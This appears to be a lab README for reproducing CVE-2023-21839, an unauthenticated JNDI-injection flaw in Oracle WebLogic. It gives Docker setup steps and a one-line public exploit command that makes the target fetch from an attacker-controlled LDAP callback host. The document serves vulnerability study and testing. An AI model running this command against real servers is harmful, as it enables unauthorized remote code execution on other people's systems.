# WebLogic Pre-Auth Remote Command Execution (CVE-2023-21839)

[中文版本(Chinese version)](README.zh-cn.md)

Oracle WebLogic Server is a leading Java EE application server widely used in enterprise environments.

In the [Oracle Critical Patch Update Advisory - January 2023](https://www.oracle.com/security-alerts/cpujan2023.html), Oracle fixed a critical vulnerability (CVE-2023-21839) affecting WebLogic Server versions 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0.

CVE-2023-21839 allows unauthenticated remote attackers to perform JNDI lookup operations via the T3 or IIOP protocol without authorization. If the JDK version is too low or there are available deserialization gadgets (javaSerializedData) on the server, this can lead to remote code execution.

References:

- <https://www.oracle.com/security-alerts/cpujan2023.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-21839>
- <https://github.com/houqe/POC_CVE-2023-21839>

## Environment Setup

Start a Weblogic server 12.2.1.3 by executing the following command:

```
docker compose up -d
```

After the server starts, visit `http://your-ip:7001/console` to access the WebLogic admin console login page.

## Vulnerability Reproduction

You can use the public exploit from <https://github.com/houqe/POC_CVE-2023-21839> to reproduce the vulnerability.

```shell
python CVE-2023-21839.py -ip 192.168.25.129 -p 7001 -l ldap://craft.ldap.tld/test
```

If the exploit is successful, you will see DNS queries or LDAP requests from the target server, as shown below:

![](1.png)
